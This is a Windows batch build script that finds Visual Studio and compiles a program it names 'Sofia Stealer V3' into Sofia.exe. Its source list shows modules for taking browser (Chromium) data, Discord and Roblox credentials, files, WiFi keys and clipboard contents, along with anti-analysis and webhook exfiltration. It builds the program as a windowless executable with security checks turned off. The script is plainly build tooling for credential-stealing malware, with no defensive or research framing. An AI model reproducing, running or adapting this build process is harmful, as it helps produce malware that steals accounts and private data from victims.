@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo [*] Searching for Visual Studio...

set "VSPATH="
for %%E in (
    "%ProgramFiles%\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles%\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat"
    "%ProgramFiles(x86)%\Microsoft Visual Studio\2017\Community\VC\Auxiliary\Build\vcvarsall.bat"
) do (
    if exist %%E (
        set "VSPATH=%%E"
        goto :found
    )
)

:found
if not defined VSPATH (
    echo [!] Visual Studio not found. Running cl.exe from current PATH.
) else (
    echo [V] Found VS: %VSPATH%
    call %VSPATH% x64
)

echo.
echo Sofia Stealer V3...

set SRC=src
set SOURCES=^
 %SRC%\main.cpp ^
 %SRC%\utils\DynamicAPI.cpp ^
 %SRC%\utils\Crypto.cpp ^
 %SRC%\utils\SQLiteHandler.cpp ^
 %SRC%\utils\Impersonator.cpp ^
 %SRC%\utils\AppBound.cpp ^
 %SRC%\modules\AntiAnalysis.cpp ^
 %SRC%\modules\SystemInfo.cpp ^
 %SRC%\modules\Chromium.cpp ^
 %SRC%\modules\Discord.cpp ^
 %SRC%\modules\Roblox.cpp ^
 %SRC%\modules\FileGrabber.cpp ^
 %SRC%\modules\WiFi.cpp ^
 %SRC%\modules\Clipboard.cpp ^
 %SRC%\modules\Webhook.cpp

cl.exe ^
  /EHsc /O2 /MT /GS- /sdl- /std:c++17 /D_CRT_SECURE_NO_WARNINGS ^
  /I"%SRC%" ^
  %SOURCES% ^
  /link ^
    /OUT:Sofia.exe ^
    /SUBSYSTEM:WINDOWS ^
    /INCREMENTAL:NO ^
    /PDB:NONE ^
    /DEFAULTLIB:libcmt.lib ^
    ws2_32.lib wlanapi.lib

if %errorlevel% neq 0 (
    echo.
    echo [X] Compilation FAILED!
) else (
    echo.
    echo [V] Sofia.exe compiled successfully!
    echo     Size: && dir Sofia.exe | findstr /i sofia.exe

    echo [*] Cleaning up .obj files...
    del /q /f *.obj >nul 2>&1
)

pause